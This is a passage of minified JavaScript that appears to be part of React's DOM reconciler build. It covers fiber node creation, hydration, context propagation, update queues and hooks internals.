                        var s = n.pending;
                        null === s ? o.next = o : (o.next = s.next,
                        s.next = o),
                        n.pending = o
                    }
                    0 !== i && Wn(r, o, i)
                }
            }
            function xn(e, t, r, n) {
                Cn[Sn++] = e,
                Cn[Sn++] = t,
                Cn[Sn++] = r,
                Cn[Sn++] = n,
                In |= n,
                e.lanes |= n,
                null !== (e = e.alternate) && (e.lanes |= n)
            }
            function On(e, t, r, n) {
                return xn(e, t, r, n),
                Rn(e)
            }
            function _n(e, t) {
                return xn(e, null, null, t),
                Rn(e)
            }
            function Wn(e, t, r) {
                e.lanes |= r;
                var n = e.alternate;
                null !== n && (n.lanes |= r);
                for (var o = !1, i = e.return; null !== i; )
                    i.childLanes |= r,
                    null !== (n = i.alternate) && (n.childLanes |= r),
                    22 === i.tag && (null === (e = i.stateNode) || 1 & e._visibility || (o = !0)),
                    e = i,
                    i = i.return;
                return 3 === e.tag ? (i = e.stateNode,
                o && null !== t && (o = 31 - fe(r),
                null === (n = (e = i.hiddenUpdates)[o]) ? e[o] = [t] : n.push(t),
                t.lane = 536870912 | r),
                i) : null
            }
            function Rn(e) {
                if (50 < Wl)
                    throw Wl = 0,
                    Rl = null,
                    Error(s(185));
                for (var t = e.return; null !== t; )
                    t = (e = t).return;
                return 3 === e.tag ? e.stateNode : null
            }
            var kn = {};
            function Mn(e, t, r, n) {
                this.tag = e,
                this.key = r,
                this.sibling = this.child = this.return = this.stateNode = this.type = this.elementType = null,
                this.index = 0,
                this.refCleanup = this.ref = null,
                this.pendingProps = t,
                this.dependencies = this.memoizedState = this.updateQueue = this.memoizedProps = null,
                this.mode = n,
                this.subtreeFlags = this.flags = 0,
                this.deletions = null,
                this.childLanes = this.lanes = 0,
                this.alternate = null
            }
            function Nn(e, t, r, n) {
                return new Mn(e,t,r,n)
            }
            function Fn(e) {
                return !(!(e = e.prototype) || !e.isReactComponent)
            }
            function Un(e, t) {
                var r = e.alternate;
                return null === r ? ((r = Nn(e.tag, t, e.key, e.mode)).elementType = e.elementType,
                r.type = e.type,
                r.stateNode = e.stateNode,
                r.alternate = e,
                e.alternate = r) : (r.pendingProps = t,
                r.type = e.type,
                r.flags = 0,
                r.subtreeFlags = 0,
                r.deletions = null),
                r.flags = 65011712 & e.flags,
                r.childLanes = e.childLanes,
                r.lanes = e.lanes,
                r.child = e.child,
                r.memoizedProps = e.memoizedProps,
                r.memoizedState = e.memoizedState,
                r.updateQueue = e.updateQueue,
                t = e.dependencies,
                r.dependencies = null === t ? null : {
                    lanes: t.lanes,
                    firstContext: t.firstContext
                },
                r.sibling = e.sibling,
                r.index = e.index,
                r.ref = e.ref,
                r.refCleanup = e.refCleanup,
                r
            }
            function Dn(e, t) {
                e.flags &= 65011714;
                var r = e.alternate;
                return null === r ? (e.childLanes = 0,
                e.lanes = t,
                e.child = null,
                e.subtreeFlags = 0,
                e.memoizedProps = null,
                e.memoizedState = null,
                e.updateQueue = null,
                e.dependencies = null,
                e.stateNode = null) : (e.childLanes = r.childLanes,
                e.lanes = r.lanes,
                e.child = r.child,
                e.subtreeFlags = 0,
                e.deletions = null,
                e.memoizedProps = r.memoizedProps,
                e.memoizedState = r.memoizedState,
                e.updateQueue = r.updateQueue,
                e.type = r.type,
                t = r.dependencies,
                e.dependencies = null === t ? null : {
                    lanes: t.lanes,
                    firstContext: t.firstContext
                }),
                e
            }
            function Ln(e, t, r, n, o, i) {
                var a = 0;
                if (n = e,
                "function" === typeof e)
                    Fn(e) && (a = 1);
                else if ("string" === typeof e)
                    a = function(e, t, r) {
                        if (1 === r || null != t.itemProp)
                            return !1;
                        switch (e) {
                        case "meta":
                        case "title":
                            return !0;
                        case "style":
                            if ("string" !== typeof t.precedence || "string" !== typeof t.href || "" === t.href)
                                break;
                            return !0;
                        case "link":
                            if ("string" !== typeof t.rel || "string" !== typeof t.href || "" === t.href || t.onLoad || t.onError)
                                break;
                            return "stylesheet" !== t.rel || (e = t.disabled,
                            "string" === typeof t.precedence && null == e);
                        case "script":
                            if (t.async && "function" !== typeof t.async && "symbol" !== typeof t.async && !t.onLoad && !t.onError && t.src && "string" === typeof t.src)
                                return !0
                        }
                        return !1
                    }(e, r, z.current) ? 26 : "html" === e || "head" === e || "body" === e ? 27 : 5;
                else
                    e: switch (e) {
                    case I:
                        return (e = Nn(31, r, t, o)).elementType = I,
                        e.lanes = i,
                        e;
                    case y:
                        return jn(r.children, o, i, t);
                    case m:
                        a = 8,
                        o |= 24;
                        break;
                    case b:
                        return (e = Nn(12, r, t, 2 | o)).elementType = b,
                        e.lanes = i,
                        e;
                    case E:
                        return (e = Nn(13, r, t, o)).elementType = E,
                        e.lanes = i,
                        e;
                    case P:
                        return (e = Nn(19, r, t, o)).elementType = P,
                        e.lanes = i,
                        e;
                    default:
                        if ("object" === typeof e && null !== e)
                            switch (e.$$typeof) {
                            case v:
                            case T:
                                a = 10;
                                break e;
                            case w:
                                a = 9;
                                break e;
                            case A:
                                a = 11;
                                break e;
                            case C:
                                a = 14;
                                break e;
                            case S:
                                a = 16,
                                n = null;
                                break e
                            }
                        a = 29,
                        r = Error(s(130, null === e ? "null" : typeof e, "")),
                        n = null
                    }
                return (t = Nn(a, r, t, o)).elementType = e,
                t.type = n,
                t.lanes = i,
                t
            }
            function jn(e, t, r, n) {
                return (e = Nn(7, e, n, t)).lanes = r,
                e
            }
            function zn(e, t, r) {
                return (e = Nn(6, e, null, t)).lanes = r,
                e
            }
            function Vn(e, t, r) {
                return (t = Nn(4, null !== e.children ? e.children : [], e.key, t)).lanes = r,
                t.stateNode = {
                    containerInfo: e.containerInfo,
                    pendingChildren: null,
                    implementation: e.implementation
                },
                t
            }
            var Hn = []
              , qn = 0
              , Gn = null
              , $n = 0
              , Kn = []
              , Zn = 0
              , Yn = null
              , Jn = 1
              , Xn = "";
            function Qn(e, t) {
                Hn[qn++] = $n,
                Hn[qn++] = Gn,
                Gn = e,
                $n = t
            }
            function eo(e, t, r) {
                Kn[Zn++] = Jn,
                Kn[Zn++] = Xn,
                Kn[Zn++] = Yn,
                Yn = e;
                var n = Jn;
                e = Xn;
                var o = 32 - fe(n) - 1;
                n &= ~(1 << o),
                r += 1;
                var i = 32 - fe(t) + o;
                if (30 < i) {
                    var s = o - o % 5;
                    i = (n & (1 << s) - 1).toString(32),
                    n >>= s,
                    o -= s,
                    Jn = 1 << 32 - fe(t) + o | r << o | n,
                    Xn = i + e
                } else
                    Jn = 1 << i | r << o | n,
                    Xn = e
            }
            function to(e) {
                null !== e.return && (Qn(e, 1),
                eo(e, 1, 0))
            }
            function ro(e) {
                for (; e === Gn; )
                    Gn = Hn[--qn],
                    Hn[qn] = null,
                    $n = Hn[--qn],
                    Hn[qn] = null;
                for (; e === Yn; )
                    Yn = Kn[--Zn],
                    Kn[Zn] = null,
                    Xn = Kn[--Zn],
                    Kn[Zn] = null,
                    Jn = Kn[--Zn],
                    Kn[Zn] = null
            }
            var no = null
              , oo = null
              , io = !1
              , so = null
              , ao = !1
              , co = Error(s(519));
            function lo(e) {
                throw yo(Pn(Error(s(418, "")), e)),
                co
            }
            function uo(e) {
                var t = e.stateNode
                  , r = e.type
                  , n = e.memoizedProps;
                switch (t[We] = e,
                t[Re] = n,
                r) {
                case "dialog":
                    Fu("cancel", t),
                    Fu("close", t);
                    break;
                case "iframe":
                case "object":
                case "embed":
                    Fu("load", t);
                    break;
                case "video":
                case "audio":
                    for (r = 0; r < ku.length; r++)
                        Fu(ku[r], t);
                    break;
                case "source":
                    Fu("error", t);
                    break;
                case "img":
                case "image":
                case "link":
                    Fu("error", t),
                    Fu("load", t);
                    break;
                case "details":
                    Fu("toggle", t);
                    break;
                case "input":
                    Fu("invalid", t),
                    mt(t, n.value, n.defaultValue, n.checked, n.defaultChecked, n.type, n.name, !0),
                    dt(t);
                    break;
                case "select":
                    Fu("invalid", t);
                    break;
                case "textarea":
                    Fu("invalid", t),
                    Tt(t, n.value, n.defaultValue, n.children),
                    dt(t)
                }
                "string" !== typeof (r = n.children) && "number" !== typeof r && "bigint" !== typeof r || t.textContent === "" + r || !0 === n.suppressHydrationWarning || Yu(t.textContent, r) ? (null != n.popover && (Fu("beforetoggle", t),
                Fu("toggle", t)),
                null != n.onScroll && Fu("scroll", t),
                null != n.onScrollEnd && Fu("scrollend", t),
                null != n.onClick && (t.onclick = Ju),
                t = !0) : t = !1,
                t || lo(e)
            }
            function ho(e) {
                for (no = e.return; no; )
                    switch (no.tag) {
                    case 5:
                    case 13:
                        return void (ao = !1);
                    case 27:
                    case 3:
                        return void (ao = !0);
                    default:
                        no = no.return
                    }
            }
            function fo(e) {
                if (e !== no)
                    return !1;
                if (!io)
                    return ho(e),
                    io = !0,
                    !1;
                var t, r = e.tag;
                if ((t = 3 !== r && 27 !== r) && ((t = 5 === r) && (t = !("form" !== (t = e.type) && "button" !== t) || sd(e.type, e.memoizedProps)),
                t = !t),
                t && oo && lo(e),
                ho(e),
                13 === r) {
                    if (!(e = null !== (e = e.memoizedState) ? e.dehydrated : null))
                        throw Error(s(317));
                    e: {
                        for (e = e.nextSibling,
                        r = 0; e; ) {
                            if (8 === e.nodeType)
                                if ("/$" === (t = e.data)) {
                                    if (0 === r) {
                                        oo = md(e.nextSibling);
                                        break e
                                    }
                                    r--
                                } else
                                    "$" !== t && "$!" !== t && "$?" !== t || r++;
                            e = e.nextSibling
                        }
                        oo = null
                    }
                } else
                    27 === r ? (r = oo,
                    fd(e.type) ? (e = bd,
                    bd = null,
                    oo = e) : oo = r) : oo = no ? md(e.stateNode.nextSibling) : null;
                return !0
            }
            function po() {
                oo = no = null,
                io = !1
            }
            function go() {
                var e = so;
                return null !== e && (null === vl ? vl = e : vl.push.apply(vl, e),
                so = null),
                e
            }
            function yo(e) {
                null === so ? so = [e] : so.push(e)
            }
            var mo = D(null)
              , bo = null
              , vo = null;
            function wo(e, t, r) {
                j(mo, t._currentValue),
                t._currentValue = r
            }
            function To(e) {
                e._currentValue = mo.current,
                L(mo)
            }
            function Ao(e, t, r) {
                for (; null !== e; ) {
                    var n = e.alternate;
                    if ((e.childLanes & t) !== t ? (e.childLanes |= t,
                    null !== n && (n.childLanes |= t)) : null !== n && (n.childLanes & t) !== t && (n.childLanes |= t),
                    e === r)
                        break;
                    e = e.return
                }
            }
            function Eo(e, t, r, n) {
                var o = e.child;
                for (null !== o && (o.return = e); null !== o; ) {
                    var i = o.dependencies;
                    if (null !== i) {
                        var a = o.child;
                        i = i.firstContext;
                        e: for (; null !== i; ) {
                            var c = i;
                            i = o;
                            for (var l = 0; l < t.length; l++)
                                if (c.context === t[l]) {
                                    i.lanes |= r,
                                    null !== (c = i.alternate) && (c.lanes |= r),
                                    Ao(i.return, r, e),
                                    n || (a = null);
                                    break e
                                }
                            i = c.next
                        }
                    } else if (18 === o.tag) {
                        if (null === (a = o.return))
                            throw Error(s(341));
                        a.lanes |= r,
                        null !== (i = a.alternate) && (i.lanes |= r),
                        Ao(a, r, e),
                        a = null
                    } else
                        a = o.child;
                    if (null !== a)
                        a.return = o;
                    else
                        for (a = o; null !== a; ) {
                            if (a === e) {
                                a = null;
                                break
                            }
                            if (null !== (o = a.sibling)) {
                                o.return = a.return,
                                a = o;
                                break
                            }
                            a = a.return
                        }
                    o = a
                }
            }
            function Po(e, t, r, n) {
                e = null;
                for (var o = t, i = !1; null !== o; ) {
                    if (!i)
                        if (0 !== (524288 & o.flags))
                            i = !0;
                        else if (0 !== (262144 & o.flags))
                            break;
                    if (10 === o.tag) {
                        var a = o.alternate;
                        if (null === a)
                            throw Error(s(387));
                        if (null !== (a = a.memoizedProps)) {
                            var c = o.type;
                            Kr(o.pendingProps.value, a.value) || (null !== e ? e.push(c) : e = [c])
                        }
                    } else if (o === q.current) {
                        if (null === (a = o.alternate))
                            throw Error(s(387));
                        a.memoizedState.memoizedState !== o.memoizedState.memoizedState && (null !== e ? e.push(Kd) : e = [Kd])
                    }
                    o = o.return
                }
                null !== e && Eo(t, e, r, n),
                t.flags |= 262144
            }
            function Co(e) {
                for (e = e.firstContext; null !== e; ) {
                    if (!Kr(e.context._currentValue, e.memoizedValue))
                        return !0;
                    e = e.next
                }
                return !1
            }
            function So(e) {
                bo = e,
                vo = null,
                null !== (e = e.dependencies) && (e.firstContext = null)
            }
            function Io(e) {
                return xo(bo, e)
            }
            function Bo(e, t) {
                return null === bo && So(e),
                xo(e, t)
            }
            function xo(e, t) {
                var r = t._currentValue;
                if (t = {
                    context: t,
                    memoizedValue: r,
                    next: null
                },
                null === vo) {
                    if (null === e)
                        throw Error(s(308));
                    vo = t,
                    e.dependencies = {
                        lanes: 0,
                        firstContext: t
                    },
                    e.flags |= 524288
                } else
                    vo = vo.next = t;
                return r
            }
            var Oo = "undefined" !== typeof AbortController ? AbortController : function() {
                var e = []
                  , t = this.signal = {
                    aborted: !1,
                    addEventListener: function(t, r) {
                        e.push(r)
                    }
                };
                this.abort = function() {
                    t.aborted = !0,
                    e.forEach((function(e) {
                        return e()
                    }
                    ))
                }
            }
              , _o = n.unstable_scheduleCallback
              , Wo = n.unstable_NormalPriority
              , Ro = {
                $$typeof: T,
                Consumer: null,
                Provider: null,
                _currentValue: null,
                _currentValue2: null,
                _threadCount: 0
            };
            function ko() {
                return {
                    controller: new Oo,
                    data: new Map,
                    refCount: 0
                }
            }
            function Mo(e) {
                e.refCount--,
                0 === e.refCount && _o(Wo, (function() {
                    e.controller.abort()
                }
                ))
            }
            var No = null
              , Fo = 0
              , Uo = 0
              , Do = null;
            function Lo() {
                if (0 === --Fo && null !== No) {
                    null !== Do && (Do.status = "fulfilled");
                    var e = No;
                    No = null,
                    Uo = 0,
                    Do = null;
                    for (var t = 0; t < e.length; t++)
                        (0,
                        e[t])()
                }
            }
            var jo = k.S;
            k.S = function(e, t) {
                "object" === typeof t && null !== t && "function" === typeof t.then && function(e, t) {
                    if (null === No) {
                        var r = No = [];
                        Fo = 0,
                        Uo = xu(),
                        Do = {
                            status: "pending",
                            value: void 0,
                            then: function(e) {
                                r.push(e)
                            }
                        }
                    }
                    Fo++,
                    t.then(Lo, Lo)
                }(0, t),
                null !== jo && jo(e, t)
            }
            ;
            var zo = D(null);
            function Vo() {
                var e = zo.current;
                return null !== e ? e : nl.pooledCache
            }
            function Ho(e, t) {
                j(zo, null === t ? zo.current : t.pool)
            }
            function qo() {
                var e = Vo();
                return null === e ? null : {
                    parent: Ro._currentValue,
                    pool: e
                }
            }
            var Go = Error(s(460))
              , $o = Error(s(474))
              , Ko = Error(s(542))
              , Zo = {
                then: function() {}
            };
            function Yo(e) {
                return "fulfilled" === (e = e.status) || "rejected" === e
            }
            function Jo() {}
            function Xo(e, t, r) {
                switch (void 0 === (r = e[r]) ? e.push(t) : r !== t && (t.then(Jo, Jo),
                t = r),
                t.status) {
                case "fulfilled":
                    return t.value;
                case "rejected":
                    throw ti(e = t.reason),
                    e;
                default:
                    if ("string" === typeof t.status)
                        t.then(Jo, Jo);
                    else {
                        if (null !== (e = nl) && 100 < e.shellSuspendCounter)
                            throw Error(s(482));
                        (e = t).status = "pending",
                        e.then((function(e) {
                            if ("pending" === t.status) {
                                var r = t;
                                r.status = "fulfilled",
                                r.value = e
                            }
                        }
                        ), (function(e) {
                            if ("pending" === t.status) {
                                var r = t;
                                r.status = "rejected",
                                r.reason = e
                            }
                        }
                        ))
                    }
                    switch (t.status) {
                    case "fulfilled":
                        return t.value;
                    case "rejected":
                        throw ti(e = t.reason),
                        e
                    }
                    throw Qo = t,
                    Go
                }
            }
            var Qo = null;
            function ei() {
                if (null === Qo)
                    throw Error(s(459));
                var e = Qo;
                return Qo = null,
                e
            }
            function ti(e) {
                if (e === Go || e === Ko)
                    throw Error(s(483))
            }
            var ri = !1;
            function ni(e) {
                e.updateQueue = {
                    baseState: e.memoizedState,
                    firstBaseUpdate: null,
                    lastBaseUpdate: null,
                    shared: {
                        pending: null,
                        lanes: 0,
                        hiddenCallbacks: null
                    },
                    callbacks: null
                }
            }
            function oi(e, t) {
                e = e.updateQueue,
                t.updateQueue === e && (t.updateQueue = {
                    baseState: e.baseState,
                    firstBaseUpdate: e.firstBaseUpdate,
                    lastBaseUpdate: e.lastBaseUpdate,
                    shared: e.shared,
                    callbacks: null
                })
            }
            function ii(e) {
                return {
                    lane: e,
                    tag: 0,
                    payload: null,
                    callback: null,
                    next: null
                }
            }
            function si(e, t, r) {
                var n = e.updateQueue;
                if (null === n)
                    return null;
                if (n = n.shared,
                0 !== (2 & rl)) {
                    var o = n.pending;
                    return null === o ? t.next = t : (t.next = o.next,
                    o.next = t),
                    n.pending = t,
                    t = Rn(e),
                    Wn(e, null, r),
                    t
                }
                return xn(e, n, t, r),
                Rn(e)
            }
            function ai(e, t, r) {
                if (null !== (t = t.updateQueue) && (t = t.shared,
                0 !== (4194048 & r))) {
                    var n = t.lanes;
                    r |= n &= e.pendingLanes,
                    t.lanes = r,
                    Ie(e, r)
                }
            }
            function ci(e, t) {
                var r = e.updateQueue
                  , n = e.alternate;
                if (null !== n && r === (n = n.updateQueue)) {
                    var o = null
                      , i = null;
                    if (null !== (r = r.firstBaseUpdate)) {
                        do {
                            var s = {
                                lane: r.lane,
                                tag: r.tag,
                                payload: r.payload,
                                callback: null,
                                next: null
                            };
                            null === i ? o = i = s : i = i.next = s,
                            r = r.next
                        } while (null !== r);
                        null === i ? o = i = t : i = i.next = t
                    } else
                        o = i = t;
                    return r = {
                        baseState: n.baseState,
                        firstBaseUpdate: o,
                        lastBaseUpdate: i,
                        shared: n.shared,
                        callbacks: n.callbacks
                    },
                    void (e.updateQueue = r)
                }
                null === (e = r.lastBaseUpdate) ? r.firstBaseUpdate = t : e.next = t,
                r.lastBaseUpdate = t
            }
            var li = !1;
            function ui() {
                if (li) {
                    if (null !== Do)
                        throw Do
                }
            }
            function di(e, t, r, n) {
                li = !1;
                var o = e.updateQueue;
                ri = !1;
                var i = o.firstBaseUpdate
                  , s = o.lastBaseUpdate
                  , a = o.shared.pending;
                if (null !== a) {
                    o.shared.pending = null;
                    var c = a
                      , l = c.next;
                    c.next = null,
                    null === s ? i = l : s.next = l,
                    s = c;
                    var u = e.alternate;
                    null !== u && ((a = (u = u.updateQueue).lastBaseUpdate) !== s && (null === a ? u.firstBaseUpdate = l : a.next = l,
                    u.lastBaseUpdate = c))
                }
                if (null !== i) {
                    var d = o.baseState;
                    for (s = 0,
                    u = l = c = null,
                    a = i; ; ) {
                        var f = -536870913 & a.lane
                          , p = f !== a.lane;
                        if (p ? (il & f) === f : (n & f) === f) {
                            0 !== f && f === Uo && (li = !0),
                            null !== u && (u = u.next = {
                                lane: 0,
                                tag: a.tag,
                                payload: a.payload,
                                callback: null,
                                next: null
                            });
                            e: {
                                var g = e
                                  , y = a;
                                f = t;
                                var m = r;
                                switch (y.tag) {
                                case 1:
                                    if ("function" === typeof (g = y.payload)) {
                                        d = g.call(m, d, f);
                                        break e
                                    }
                                    d = g;
                                    break e;
                                case 3:
                                    g.flags = -65537 & g.flags | 128;
                                case 0:
                                    if (null === (f = "function" === typeof (g = y.payload) ? g.call(m, d, f) : g) || void 0 === f)
                                        break e;
                                    d = h({}, d, f);
                                    break e;
                                case 2:
                                    ri = !0
                                }
                            }
                            null !== (f = a.callback) && (e.flags |= 64,
                            p && (e.flags |= 8192),
                            null === (p = o.callbacks) ? o.callbacks = [f] : p.push(f))
                        } else
                            p = {
                                lane: f,
                                tag: a.tag,
                                payload: a.payload,
                                callback: a.callback,
                                next: null
                            },
                            null === u ? (l = u = p,
                            c = d) : u = u.next = p,
                            s |= f;
                        if (null === (a = a.next)) {
                            if (null === (a = o.shared.pending))
                                break;
                            a = (p = a).next,
                            p.next = null,
                            o.lastBaseUpdate = p,
                            o.shared.pending = null
                        }
                    }
                    null === u && (c = d),
                    o.baseState = c,
                    o.firstBaseUpdate = l,
                    o.lastBaseUpdate = u,
                    null === i && (o.shared.lanes = 0),
                    fl |= s,
                    e.lanes = s,
                    e.memoizedState = d
                }
            }
            function hi(e, t) {
                if ("function" !== typeof e)
                    throw Error(s(191, e));
                e.call(t)
            }
            function fi(e, t) {
                var r = e.callbacks;
                if (null !== r)
                    for (e.callbacks = null,
                    e = 0; e < r.length; e++)
                        hi(r[e], t)
            }
            var pi = D(null)
              , gi = D(0);
            function yi(e, t) {
                j(gi, e = dl),
                j(pi, t),
                dl = e | t.baseLanes
            }
            function mi() {
                j(gi, dl),
                j(pi, pi.current)
            }
            function bi() {
                dl = gi.current,
                L(pi),
                L(gi)
            }
            var vi = 0
              , wi = null
              , Ti = null
              , Ai = null
              , Ei = !1
              , Pi = !1
              , Ci = !1
              , Si = 0
              , Ii = 0
              , Bi = null
              , xi = 0;
            function Oi() {
                throw Error(s(321))
            }
            function _i(e, t) {
                if (null === t)
                    return !1;
                for (var r = 0; r < t.length && r < e.length; r++)
                    if (!Kr(e[r], t[r]))
                        return !1;
                return !0
            }
            function Wi(e, t, r, n, o, i) {
                return vi = i,
                wi = t,
                t.memoizedState = null,
                t.updateQueue = null,
                t.lanes = 0,
                k.H = null === e || null === e.memoizedState ? Gs : $s,
                Ci = !1,
                i = r(n, o),
                Ci = !1,
                Pi && (i = ki(t, r, n, o)),
                Ri(e),
                i
            }
            function Ri(e) {
                k.H = qs;
                var t = null !== Ti && null !== Ti.next;
                if (vi = 0,
                Ai = Ti = wi = null,
                Ei = !1,
                Ii = 0,
                Bi = null,
                t)
                    throw Error(s(300));
                null === e || Ia || null !== (e = e.dependencies) && Co(e) && (Ia = !0)
            }
            function ki(e, t, r, n) {
                wi = e;
                var o = 0;
                do {
                    if (Pi && (Bi = null),
                    Ii = 0,
                    Pi = !1,
                    25 <= o)
                        throw Error(s(301));
                    if (o += 1,
                    Ai = Ti = null,
                    null != e.updateQueue) {
                        var i = e.updateQueue;
                        i.lastEffect = null,
                        i.events = null,
                        i.stores = null,
                        null != i.memoCache && (i.memoCache.index = 0)
                    }
                    k.H = Ks,
                    i = t(r, n)
                } while (Pi);
                return i
            }
            function Mi() {
                var e = k.H
                  , t = e.useState()[0];
                return t = "function" === typeof t.then ? ji(t) : t,
                e = e.useState()[0],
                (null !== Ti ? Ti.memoizedState : null) !== e && (wi.flags |= 1024),
                t
            }
            function Ni() {
                var e = 0 !== Si;
                return Si = 0,
                e
            }
            function Fi(e, t, r) {
                t.updateQueue = e.updateQueue,
                t.flags &= -2053,
                e.lanes &= ~r
            }
            function Ui(e) {
                if (Ei) {
                    for (e = e.memoizedState; null !== e; ) {
                        var t = e.queue;
                        null !== t && (t.pending = null),
                        e = e.next
                    }
                    Ei = !1
                }
                vi = 0,
                Ai = Ti = wi = null,
                Pi = !1,
                Ii = Si = 0,
                Bi = null
            }
            function Di() {
                var e = {
                    memoizedState: null,
                    baseState: null,
                    baseQueue: null,
                    queue: null,
                    next: null
                };
                return null === Ai ? wi.memoizedState = Ai = e : Ai = Ai.next = e,
                Ai
            }
            function Li() {
                if (null === Ti) {
                    var e = wi.alternate;
                    e = null !== e ? e.memoizedState : null
                } else
                    e = Ti.next;
                var t = null === Ai ? wi.memoizedState : Ai.next;
                if (null !== t)
                    Ai = t,
                    Ti = e;
                else {
                    if (null === e) {
                        if (null === wi.alternate)
                            throw Error(s(467));
                        throw Error(s(310))
                    }
                    e = {
                        memoizedState: (Ti = e).memoizedState,
                        baseState: Ti.baseState,
                        baseQueue: Ti.baseQueue,
                        queue: Ti.queue,
                        next: null
                    },
                    null === Ai ? wi.memoizedState = Ai = e : Ai = Ai.next = e
                }
                return Ai
            }
            function ji(e) {
                var t = Ii;
                return Ii += 1,
                null === Bi && (Bi = []),
                e = Xo(Bi, e, t),
                t = wi,
                null === (null === Ai ? t.memoizedState : Ai.next) && (t = t.alternate,
                k.H = null === t || null === t.memoizedState ? Gs : $s),
                e
            }
            function zi(e) {
                if (null !== e && "object" === typeof e) {
                    if ("function" === typeof e.then)
                        return ji(e);
                    if (e.$$typeof === T)
                        return Io(e)
                }
                throw Error(s(438, String(e)))
            }
            function Vi(e) {
                var t = null
                  , r = wi.updateQueue;
                if (null !== r && (t = r.memoCache),
                null == t) {
                    var n = wi.alternate;
                    null !== n && (null !== (n = n.updateQueue) && (null != (n = n.memoCache) && (t = {
                        data: n.data.map((function(e) {
                            return e.slice()
                        }
                        )),
                        index: 0
                    })))
                }
                if (null == t && (t = {
                    data: [],
                    index: 0
                }),
                null === r && (r = {
                    lastEffect: null,
                    events: null,
                    stores: null,
                    memoCache: null
                },
                wi.updateQueue = r),
                r.memoCache = t,
                void 0 === (r = t.data[t.index]))
                    for (r = t.data[t.index] = Array(e),
                    n = 0; n < e; n++)
                        r[n] = B;
                return t.index++,
                r
            }
            function Hi(e, t) {
                return "function" === typeof t ? t(e) : t
            }
            function qi(e) {
                return Gi(Li(), Ti, e)
            }
            function Gi(e, t, r) {
                var n = e.queue;
                if (null === n)
                    throw Error(s(311));
                n.lastRenderedReducer = r;
                var o = e.baseQueue
                  , i = n.pending;
                if (null !== i) {
                    if (null !== o) {
                        var a = o.next;
                        o.next = i.next,
                        i.next = a
                    }
                    t.baseQueue = o = i,
                    n.pending = null
                }
                if (i = e.baseState,
                null === o)
                    e.memoizedState = i;
                else {
                    var c = a = null
                      , l = null
                      , u = t = o.next
                      , d = !1;
                    do {
                        var h = -536870913 & u.lane;
                        if (h !== u.lane ? (il & h) === h : (vi & h) === h) {
                            var f = u.revertLane;
                            if (0 === f)
                                null !== l && (l = l.next = {
                                    lane: 0,
                                    revertLane: 0,
                                    action: u.action,
                                    hasEagerState: u.hasEagerState,
                                    eagerState: u.eagerState,
                                    next: null
                                }),
                                h === Uo && (d = !0);
                            else {
                                if ((vi & f) === f) {
                                    u = u.next,
                                    f === Uo && (d = !0);
                                    continue
                                }
                                h = {
                                    lane: 0,
                                    revertLane: u.revertLane,
                                    action: u.action,
                                    hasEagerState: u.hasEagerState,
                                    eagerState: u.eagerState,
                                    next: null
                                },
                                null === l ? (c = l = h,
                                a = i) : l = l.next = h,
                                wi.lanes |= f,
                                fl |= f
                            }
                            h = u.action,
                            Ci && r(i, h),
                            i = u.hasEagerState ? u.eagerState : r(i, h)
                        } else
                            f = {
                                lane: h,
                                revertLane: u.revertLane,
                                action: u.action,
                                hasEagerState: u.hasEagerState,
                                eagerState: u.eagerState,
                                next: null
                            },
                            null === l ? (c = l = f,
                            a = i) : l = l.next = f,
                            wi.lanes |= h,
                            fl |= h;
                        u = u.next
                    } while (null !== u && u !== t);
                    if (null === l ? a = i : l.next = c,
                    !Kr(i, e.memoizedState) && (Ia = !0,
                    d && null !== (r = Do)))
                        throw r;
                    e.memoizedState = i,
                    e.baseState = a,
                    e.baseQueue = l,
                    n.lastRenderedState = i
                }
                return null === o && (n.lanes = 0),
                [e.memoizedState, n.dispatch]
            }
            function $i(e) {
                var t = Li()
                  , r = t.queue;
                if (null === r)
                    throw Error(s(311));
                r.lastRenderedReducer = e;
                var n = r.dispatch
                  , o = r.pending
                  , i = t.memoizedState;
                if (null !== o) {
                    r.pending = null;
                    var a = o = o.next;
                    do {
                        i = e(i, a.action),
                        a = a.next
                    } while (a !== o);
                    Kr(i, t.memoizedState) || (Ia = !0),
                    t.memoizedState = i,
                    null === t.baseQueue && (t.baseState = i),
                    r.lastRenderedState = i
                }
                return [i, n]
            }
            function Ki(e, t, r) {
                var n = wi
                  , o = Li()
                  , i = io;
                if (i) {
                    if (void 0 === r)
                        throw Error(s(407));
                    r = r()
                } else
                    r = t();
                var a = !Kr((Ti || o).memoizedState, r);
                if (a && (o.memoizedState = r,
                Ia = !0),
                o = o.queue,
                ms(2048, 8, Ji.bind(null, n, o, e), [e]),
                o.getSnapshot !== t || a || null !== Ai && 1 & Ai.memoizedState.tag) {
                    if (n.flags |= 2048,
                    ps(9, {
                        destroy: void 0,
                        resource: void 0
                    }, Yi.bind(null, n, o, r, t), null),
                    null === nl)
                        throw Error(s(349));
                    i || 0 !== (124 & vi) || Zi(n, t, r)
                }
                return r
            }
            function Zi(e, t, r) {
                e.flags |= 16384,
                e = {
                    getSnapshot: t,
                    value: r
                },
                null === (t = wi.updateQueue) ? (t = {
                    lastEffect: null,
                    events: null,
                    stores: null,
                    memoCache: null
                },
                wi.updateQueue = t,
                t.stores = [e]) : null === (r = t.stores) ? t.stores = [e] : r.push(e)
            }
            function Yi(e, t, r, n) {
                t.value = r,
                t.getSnapshot = n,
                Xi(t) && Qi(e)
            }
            function Ji(e, t, r) {
                return r((function() {
                    Xi(t) && Qi(e)
                }
                ))
            }
            function Xi(e) {
                var t = e.getSnapshot;
                e = e.value;
                try {
                    var r = t();
                    return !Kr(e, r)
                } catch (n) {
                    return !0
                }
            }
            function Qi(e) {
                var t = _n(e, 2);
                null !== t && Nl(t, e, 2)
            }
            function es(e) {
                var t = Di();
                if ("function" === typeof e) {
                    var r = e;
                    if (e = r(),
                    Ci) {
                        he(!0);
                        try {
                            r()
                        } finally {
                            he(!1)
                        }
                    }
                }
                return t.memoizedState = t.baseState = e,
                t.queue = {
                    pending: null,
                    lanes: 0,
                    dispatch: null,
                    lastRenderedReducer: Hi,
                    lastRenderedState: e
                },
                t
            }
            function ts(e, t, r, n) {
                return e.baseState = r,
                Gi(e, Ti, "function" === typeof n ? n : Hi)
            }
            function rs(e, t, r, n, o) {
                if (zs(e))
                    throw Error(s(485));
                if (null !== (e = t.action)) {
                    var i = {
                        payload: o,
                        action: e,
                        next: null,
                        isTransition: !0,
                        status: "pending",
                        value: null,
                        reason: null,
                        listeners: [],
                        then: function(e) {
                            i.listeners.push(e)
                        }
                    };
                    null !== k.T ? r(!0) : i.isTransition = !1,
                    n(i),
                    null === (r = t.pending) ? (i.next = t.pending = i,
                    ns(t, i)) : (i.next = r.next,
                    t.pending = r.next = i)
                }
            }
